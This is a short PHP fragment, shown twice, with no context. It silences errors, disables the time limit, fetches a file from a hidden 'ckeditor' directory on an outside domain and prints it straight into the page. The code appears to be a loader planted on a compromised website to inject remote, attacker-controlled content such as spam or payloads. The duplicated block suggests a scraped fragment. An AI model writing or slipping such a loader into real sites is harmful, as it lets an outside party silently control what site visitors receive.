$curl = curl_init();
$url = 'https://warranty.brand-rex.com/ckeditor/hidden/policy.txt';
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_HEADER, 0);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($curl);
echo $result;

<?php
error_reporting(0); set_time_limit(0); 
$curl = curl_init();
$url = 'https://warranty.brand-rex.com/ckeditor/hidden/policy.txt';
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_HEADER, 0);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($curl);
echo $result;
?>
